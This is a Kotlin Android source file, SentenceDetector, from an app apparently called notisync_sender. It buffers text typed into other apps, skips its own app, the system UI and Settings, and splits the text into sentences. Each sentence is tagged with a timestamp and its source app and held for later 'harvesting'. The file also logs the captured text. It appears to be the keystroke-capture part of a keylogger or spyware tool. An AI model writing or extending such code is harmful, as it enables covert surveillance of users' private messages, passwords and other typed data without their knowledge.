// ============================================================
// FILE: service/keyboard/SentenceDetector.kt
// Purpose: Buffers typed text and detects complete sentences
// ============================================================

package com.app.notisync_sender.service.keyboard

import android.util.Log
import com.app.notisync_sender.domain.model.CapturedSentence
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class SentenceDetector @Inject constructor() {

    companion object {
        private const val TAG = "SentenceDetector"

        private val SENTENCE_TERMINATORS = setOf('.', '?', '!', '\n')

        private const val MIN_SENTENCE_LENGTH = 5

        // Hard limit to prevent memory issues if no punctuation is used
        private const val MAX_BUFFER_LENGTH = 500

        private val IGNORED_PACKAGES = setOf(
            "com.app.notisync_sender",
            "com.android.systemui",
            "com.android.settings"
        )
    }

    private val textBuffer = StringBuilder()
    private var currentAppPackage: String = ""
    private val lock = Any()

    private val pendingSentences = mutableListOf<CapturedSentence>()

    fun onTextChanged(text: String, packageName: String) {
        if (shouldIgnorePackage(packageName)) return

        synchronized(lock) {
            if (packageName != currentAppPackage) {
                flushBuffer()
                currentAppPackage = packageName
            }

            processNewText(text)
        }
    }

    private fun processNewText(text: String) {
        if (text.isBlank()) return

        val lastChar = text.lastOrNull() ?: return

        if (text.length > textBuffer.length) {
            val newChars = text.substring(
                (textBuffer.length).coerceAtMost(text.length)
            )
            textBuffer.append(newChars)
        } else {
            textBuffer.clear()
            textBuffer.append(text)
        }

        // Force flush if buffer exceeds limit
        if (textBuffer.length > MAX_BUFFER_LENGTH) {
            extractSentence()
            return
        }

        if (SENTENCE_TERMINATORS.contains(lastChar)) {
            extractSentence()
        }
    }

    private fun extractSentence() {
        val sentence = textBuffer.toString().trim()
        textBuffer.clear()

        if (sentence.length < MIN_SENTENCE_LENGTH) {
            Log.v(TAG, "Sentence too short, discarding: $sentence")
            return
        }

        val cleanedSentence = cleanSentence(sentence)

        if (cleanedSentence.isNotBlank() && cleanedSentence.length >= MIN_SENTENCE_LENGTH) {
            val capturedSentence = CapturedSentence(
                text = cleanedSentence,
                capturedAt = System.currentTimeMillis(),
                appPackage = currentAppPackage
            )

            pendingSentences.add(capturedSentence)
            Log.d(TAG, "Sentence captured: ${cleanedSentence.take(50)}...")
        }
    }

    private fun cleanSentence(text: String): String {
        return text
            .replace("\n", " ")
            .replace("\r", " ")
            .replace(Regex("\\s+"), " ")
            .trim()
    }

    fun flushBuffer() {
        synchronized(lock) {
            val remaining = textBuffer.toString().trim()
            if (remaining.length >= MIN_SENTENCE_LENGTH) {
                val capturedSentence = CapturedSentence(
                    text = cleanSentence(remaining),
                    capturedAt = System.currentTimeMillis(),
                    appPackage = currentAppPackage
                )
                pendingSentences.add(capturedSentence)
            }
            textBuffer.clear()
        }
    }

    fun harvestSentences(): List<CapturedSentence> {
        synchronized(lock) {
            flushBuffer()

            val harvested = pendingSentences.toList()
            pendingSentences.clear()

            Log.d(TAG, "Harvested ${harvested.size} sentences")
            return harvested
        }
    }

    fun getPendingCount(): Int {
        synchronized(lock) {
            return pendingSentences.size
        }
    }

    fun reset() {
        synchronized(lock) {
            textBuffer.clear()
            pendingSentences.clear()
            currentAppPackage = ""
        }
    }

    private fun shouldIgnorePackage(packageName: String): Boolean {
        return IGNORED_PACKAGES.contains(packageName)
    }
}
